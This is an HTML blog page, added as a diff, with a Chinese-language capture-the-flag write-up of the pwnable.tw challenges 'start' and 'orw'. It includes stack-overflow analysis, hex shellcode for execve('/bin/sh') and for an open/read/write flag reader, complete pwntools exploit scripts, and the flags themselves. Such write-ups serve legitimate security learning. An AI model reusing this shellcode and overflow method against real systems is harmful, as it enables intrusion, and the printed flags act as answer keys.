@@ -1,0 +1,889 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="pwn," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="题目链接：https://pwnable.tw/">
+<meta name="keywords" content="pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Pwnable.tw">
+<meta property="og:url" content="http://yoursite.com/2019/01/21/Pwnable-tw/index.html">
+<meta property="og:site_name" content="Muirelle的博客">
+<meta property="og:description" content="题目链接：https://pwnable.tw/">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://i.imgur.com/j9piDw5.png">
+<meta property="og:image" content="https://i.imgur.com/NzkCLTV.png">
+<meta property="og:image" content="https://i.imgur.com/XtqjB0q.png">
+<meta property="og:image" content="https://i.imgur.com/BoS1Nha.png">
+<meta property="og:image" content="https://i.imgur.com/slEapRE.png">
+<meta property="og:image" content="https://i.imgur.com/fnyJlAe.png">
+<meta property="og:image" content="https://i.imgur.com/YDjWNVj.png">
+<meta property="og:image" content="https://i.imgur.com/gucjr8C.png">
+<meta property="og:image" content="https://i.imgur.com/bOYw8Dp.png">
+<meta property="og:image" content="https://i.imgur.com/9ouLIFN.png">
+<meta property="og:image" content="https://i.imgur.com/xcvRPTU.png">
+<meta property="og:updated_time" content="2019-01-29T08:56:39.545Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Pwnable.tw">
+<meta name="twitter:description" content="题目链接：https://pwnable.tw/">
+<meta name="twitter:image" content="https://i.imgur.com/j9piDw5.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/01/21/Pwnable-tw/"/>
+
+
+
+
+
+  <title>Pwnable.tw | Muirelle的博客</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Muirelle的博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/21/Pwnable-tw/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Muirelle">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Muirelle的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Pwnable.tw</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-01-21T15:33:58+08:00">
+                2019-01-21
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2019/01/21/Pwnable-tw/" class="leancloud_visitors" data-flag-title="Pwnable.tw">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>题目链接：<a href="https://pwnable.tw/" target="_blank" rel="noopener">https://pwnable.tw/</a></p>
+<a id="more"></a>
+<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><h2 id="start"><a href="#start" class="headerlink" title="start"></a>start</h2><p>题目：</p>
+<p><a href="https://pwnable.tw/static/chall/start" target="_blank" rel="noopener">https://pwnable.tw/static/chall/start</a></p>
+<p><strong>nc chall.pwnable.tw 10000</strong></p>
+<p><img src="https://i.imgur.com/j9piDw5.png" alt=""><br>32位，静态链接</p>
+<p><img src="https://i.imgur.com/NzkCLTV.png" alt=""></p>
+<p>输入一些东西之后没什么反应</p>
+<p><img src="https://i.imgur.com/XtqjB0q.png" alt=""></p>
+<p>可以看到</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x0804806e</span> &lt;+<span class="number">14</span>&gt;:    <span class="keyword">push</span>   <span class="number">0x3a465443</span></span><br><span class="line"><span class="number">0x08048073</span> &lt;+<span class="number">19</span>&gt;:    <span class="keyword">push</span>   <span class="number">0x20656874</span></span><br><span class="line"><span class="number">0x08048078</span> &lt;+<span class="number">24</span>&gt;:    <span class="keyword">push</span>   <span class="number">0x20747261</span></span><br><span class="line"><span class="number">0x0804807d</span> &lt;+<span class="number">29</span>&gt;:    <span class="keyword">push</span>   <span class="number">0x74732073</span></span><br><span class="line"><span class="number">0x08048082</span> &lt;+<span class="number">34</span>&gt;:    <span class="keyword">push</span>   <span class="number">0x2774654c</span></span><br></pre></td></tr></table></figure>
+<p>这一段就是 <strong>Let’s start the CTF:</strong></p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x08048087</span> &lt;+<span class="number">39</span>&gt;:    <span class="keyword">mov</span>    <span class="built_in">ecx</span>,<span class="built_in">esp</span>  <span class="comment">;要写的数据的地址</span></span><br><span class="line"><span class="number">0x08048089</span> &lt;+<span class="number">41</span>&gt;:    <span class="keyword">mov</span>    <span class="built_in">dl</span>,<span class="number">0x14</span>  <span class="comment">;要写的数据长度</span></span><br><span class="line"><span class="number">0x0804808b</span> &lt;+<span class="number">43</span>&gt;:    <span class="keyword">mov</span>    <span class="built_in">bl</span>,<span class="number">0x1</span>   <span class="comment">;文件描述符file descriptor (stdout)</span></span><br><span class="line"><span class="number">0x0804808d</span> &lt;+<span class="number">45</span>&gt;:    <span class="keyword">mov</span>    <span class="built_in">al</span>,<span class="number">0x4</span>   <span class="comment">;系统调用码system call number (sys_write)</span></span><br><span class="line"><span class="number">0x0804808f</span> &lt;+<span class="number">47</span>&gt;:    <span class="keyword">int</span>    <span class="number">0x80</span>     <span class="comment">;调用内核call kernel</span></span><br></pre></td></tr></table></figure>
+<p>和</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x08048091</span> &lt;+<span class="number">49</span>&gt;:    <span class="keyword">xor</span>    <span class="built_in">ebx</span>,<span class="built_in">ebx</span>  <span class="comment">;文件描述符file descriptor (stdin)</span></span><br><span class="line"><span class="number">0x08048093</span> &lt;+<span class="number">51</span>&gt;:    <span class="keyword">mov</span>    <span class="built_in">dl</span>,<span class="number">0x3c</span>  <span class="comment">;数据长度</span></span><br><span class="line"><span class="number">0x08048095</span> &lt;+<span class="number">53</span>&gt;:    <span class="keyword">mov</span>    <span class="built_in">al</span>,<span class="number">0x3</span>   <span class="comment">;系统调用码system call number (sys_read)</span></span><br><span class="line"><span class="number">0x08048097</span> &lt;+<span class="number">55</span>&gt;:    <span class="keyword">int</span>    <span class="number">0x80</span>     <span class="comment">;调用内核call kernel</span></span><br></pre></td></tr></table></figure>
+<p>分别是两段linux的系统调用(<a href="https://www.tutorialspoint.com/assembly_programming/assembly_system_calls.htm" target="_blank" rel="noopener">Linux System Call</a>)</p>
+<p>分别调用了write和read，用于将刚刚那句提示信息输出到屏幕和读取我们输入的数据。</p>
+<p>下个断点看看<br><img src="https://i.imgur.com/BoS1Nha.png" alt=""></p>
+<p>覆盖了ret的地址</p>
+<p>再看一下开了什么保护</p>
+<p><img src="https://i.imgur.com/slEapRE.png" alt=""><br>emm什么都没开，本来一开始是想ret2libc的，但是找了半天的gadgets想ROP结果白忙活一场，后来查了一下发现由于这个文件是静态链接生成的(statically linked)，没办法ret2libc，所以自然想到ret2shellcode</p>
+<p>现在的问题就是要在栈上找个位置放shellcode。</p>
+<p>注意到程序一开始将esp的值push到栈里了，而且经过gdb调试发现ret返回后这个值刚好在栈顶，所以，将ret的值覆盖为<strong>0x8048087</strong>，于是再一次调用write将栈顶的值泄露出来。<br><img src="https://i.imgur.com/fnyJlAe.png" alt=""></p>
+<p>在第二轮write和read后，ret之前，栈中期待的效果是这样<br><img src="https://i.imgur.com/YDjWNVj.png" alt=""></p>
+<p>黄色为20个字节的padding，红色是已经被泄露出来的栈地址，蓝色是将要填充的第二次ret地址，所以应该跟在他后面，为<strong>0xbffff734</strong> = <strong>泄露的esp</strong> + <strong>20</strong>，橙色部分则为shellcode。</p>
+<p>由此构造出最后脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'chall.pwnable.tw'</span>,<span class="number">10000</span>)</span><br><span class="line"><span class="keyword">print</span> (r.recv())</span><br><span class="line">shellcode = <span class="string">'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'</span></span><br><span class="line">ret = <span class="number">0x08048087</span></span><br><span class="line">p1 = <span class="string">'a'</span>*<span class="number">20</span> + p32(ret)</span><br><span class="line">r.send(p1)</span><br><span class="line">addr = u32(r.recv(<span class="number">4</span>))</span><br><span class="line">p2 = <span class="string">'a'</span>*<span class="number">20</span> + p32(addr+<span class="number">20</span>) +  shellcode</span><br><span class="line">r.send(p2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<p>shellcode还是在<a href="http://shell-storm.org/shellcode/" target="_blank" rel="noopener">http://shell-storm.org/shellcode/</a>这上面找的。选了一个execve(‘/bin/sh’)的</p>
+<p><img src="https://i.imgur.com/gucjr8C.png" alt=""></p>
+<p>最后getshell，在start用户目录下找到flag文件</p>
+<p><strong>FLAG{Pwn4bl3_tW_1s_y0ur_st4rt}</strong></p>
+<h2 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h2><p>题目：</p>
+<p><a href="https://pwnable.tw/static/chall/orw" target="_blank" rel="noopener">https://pwnable.tw/static/chall/orw</a></p>
+<p><strong>nc chall.pwnable.tw 10001</strong></p>
+<p>看一眼保护<br><img src="https://i.imgur.com/bOYw8Dp.png" alt=""></p>
+<p><img src="https://i.imgur.com/9ouLIFN.png" alt=""></p>
+<p>先注意到红框和蓝框部分，蓝框部分用read读取输入之后直接call了刚刚输入的内容。。。明摆着的ret2shellcode。</p>
+<p>但是红框里的函数没见过，简单了解一了下这个函数的作用就是让该进程进入“安全”模式，所有除了read，write，exit和sigreturn的系统调用都会触发sigkill信号来终止进程。</p>
+<p>而题目提示我们只有open，read， write三个可用的syscall。同时又告诉了我们flag的位置：<strong>/home/orw/flag</strong></p>
+<p>所以思路就是先用open打开flag文件，再用read读取flag文件，最后用write输出到屏幕。</p>
+<p>先将<strong>/home/orw/flag</strong>转换成hex：</p>
+<p><strong>2f686f6d652f6f72772f666c61670000</strong></p>
+<p>再转成小端序：</p>
+<p><strong>000067616c662f77726f2f656d6f682f</strong></p>
+<p>最后的汇编代码如下：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:  <span class="number">31</span> c0                   <span class="keyword">xor</span>    <span class="built_in">eax</span>,<span class="built_in">eax</span>		<span class="comment">;</span></span><br><span class="line"><span class="number">2</span>:  <span class="number">31</span> <span class="built_in">db</span>                   <span class="keyword">xor</span>    <span class="built_in">ebx</span>,<span class="built_in">ebx</span>		<span class="comment">;</span></span><br><span class="line"><span class="number">4</span>:  <span class="number">31</span> c9                   <span class="keyword">xor</span>    <span class="built_in">ecx</span>,<span class="built_in">ecx</span>		<span class="comment">;</span></span><br><span class="line"><span class="number">6</span>:  <span class="number">31</span> d2                   <span class="keyword">xor</span>    <span class="built_in">edx</span>,<span class="built_in">edx</span>		<span class="comment">;清零</span></span><br><span class="line"><span class="number">8</span>:  <span class="number">68</span> <span class="number">61</span> <span class="number">67</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">push</span>   <span class="number">0x6761</span>		<span class="comment">;</span></span><br><span class="line"><span class="symbol">d:</span>  <span class="number">68</span> <span class="number">77</span> 2f <span class="number">66</span> 6c          <span class="keyword">push</span>   <span class="number">0x6c662f77</span>		<span class="comment">;</span></span><br><span class="line"><span class="number">12</span>: <span class="number">68</span> <span class="number">65</span> 2f 6f <span class="number">72</span>          <span class="keyword">push</span>   <span class="number">0x726f2f65</span>		<span class="comment">;</span></span><br><span class="line"><span class="number">17</span>: <span class="number">68</span> 2f <span class="number">68</span> 6f <span class="number">6d</span>          <span class="keyword">push</span>   <span class="number">0x6d6f682f</span>		<span class="comment">;/home/orw/flag</span></span><br><span class="line">1c: b8 <span class="number">05</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0x5</span>		<span class="comment">;system call number (open)</span></span><br><span class="line"><span class="number">21</span>: <span class="number">89</span> e3                   <span class="keyword">mov</span>    <span class="built_in">ebx</span>,<span class="built_in">esp</span>		<span class="comment">;将刚才入栈的字符串地址作为第一个参数传给open</span></span><br><span class="line"><span class="number">23</span>: cd <span class="number">80</span>                   <span class="keyword">int</span>    <span class="number">0x80</span>			<span class="comment">;call kernal</span></span><br><span class="line"><span class="number">25</span>: <span class="number">89</span> d9                   <span class="keyword">mov</span>    <span class="built_in">ecx</span>,<span class="built_in">ebx</span>		<span class="comment">;将刚才的esp传给ecx</span></span><br><span class="line"><span class="number">27</span>: <span class="number">89</span> c3                   <span class="keyword">mov</span>    <span class="built_in">ebx</span>,<span class="built_in">eax</span>		<span class="comment">;eax接收了open的返回值后作为file descriptor赋值给ebx作为read的第一个参数</span></span><br><span class="line"><span class="number">29</span>: b8 <span class="number">03</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0x3</span>		<span class="comment">;system call number (read)</span></span><br><span class="line">2e: ba <span class="number">30</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="built_in">edx</span>,<span class="number">0x30</span>		<span class="comment">;选一个较大的数字作为length</span></span><br><span class="line"><span class="number">33</span>: cd <span class="number">80</span>                   <span class="keyword">int</span>    <span class="number">0x80</span>			<span class="comment">;call kernel</span></span><br><span class="line"><span class="number">35</span>: b8 <span class="number">04</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0x4</span>		<span class="comment">;system call number (write)</span></span><br><span class="line">3a: bb <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="built_in">ebx</span>,<span class="number">0x1</span>		<span class="comment">;file descriptor(stdout)</span></span><br><span class="line">3f: ba <span class="number">30</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="built_in">edx</span>,<span class="number">0x30</span>		<span class="comment">;length</span></span><br><span class="line"><span class="number">44</span>: cd <span class="number">80</span>                   <span class="keyword">int</span>    <span class="number">0x80</span> 		<span class="comment">;call kernel</span></span><br></pre></td></tr></table></figure>
+<p>生成shellcode：</p>
+<p><strong>“\x31\xC0\x31\xDB\x31\xC9\x31\xD2\x68\x61\x67\x00\x00\x68\x77\x2F\x66\x6C\x68\x65\x2F\x6F\x72\x68\x2F\x68\x6F\x6D\xB8\x05\x00\x00\x00\x89\xE3\xCD\x80\x89\xD9\x89\xC3\xB8\x03\x00\x00\x00\xBA\x30\x00\x00\x00\xCD\x80\xB8\x04\x00\x00\x00\xBB\x01\x00\x00\x00\xBA\x30\x00\x00\x00\xCD\x80”</strong></p>
+<p>网址：<a href="https://defuse.ca/online-x86-assembler.htm#disassembly" target="_blank" rel="noopener">https://defuse.ca/online-x86-assembler.htm#disassembly</a></p>
+<p>简单介绍一下linux system call：</p>
+<p><img src="https://i.imgur.com/xcvRPTU.png" alt=""></p>
+<ul>
+<li>eax的用处是传递system call number</li>
+<li>ebx，ecx，edx，esi，edi和ebp<strong>按顺序依次</strong>存放syscall的各个参数。（比如调用sys_read：eax为3，ebx为file descriptor，ecx为buffer的地址，edx为读取数据的长度。）</li>
+<li>最后int 0x80根据eax的值来执行相关的中断</li>
+<li>返回值通常存放在eax中</li>
+</ul>
+<p>最后脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">shellcode = <span class="string">"\x31\xC0\x31\xDB\x31\xC9\x31\xD2\x68\x61\x67\x00\x00\x68\x77\x2F\x66\x6C\x68\x65\x2F\x6F\x72\x68\x2F\x68\x6F\x6D\xB8\x05\x00\x00\x00\x89\xE3\xCD\x80\x89\xD9\x89\xC3\xB8\x03\x00\x00\x00\xBA\x30\x00\x00\x00\xCD\x80\xB8\x04\x00\x00\x00\xBB\x01\x00\x00\x00\xBA\x30\x00\x00\x00\xCD\x80"</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"chall.pwnable.tw"</span>, <span class="number">10001</span>)</span><br><span class="line">r.recvuntil(<span class="string">"shellcode:"</span>)</span><br><span class="line">r.sendline(shellcode)</span><br><span class="line"><span class="keyword">print</span> r.recv()</span><br></pre></td></tr></table></figure>
+<p><strong>FLAG{sh3llc0ding_w1th_op3n_r34d_writ3}</strong></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/01/20/pwntools安装/" rel="next" title="pwntools安装和使用">
+                <i class="fa fa-chevron-left"></i> pwntools安装和使用
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Muirelle</p>
+              <p class="site-description motion-element" itemprop="description">吾将上下而求索</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">16</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#题目"><span class="nav-number">1.</span> <span class="nav-text">题目</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#start"><span class="nav-number">1.1.</span> <span class="nav-text">start</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#orw"><span class="nav-number">1.2.</span> <span class="nav-text">orw</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2018 &mdash; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Muirelle</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("K1WEvzezolboN84rQYlF0Dvv-gzGzoHsz", "KnwfedBiA348tAxLpapkotlB");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
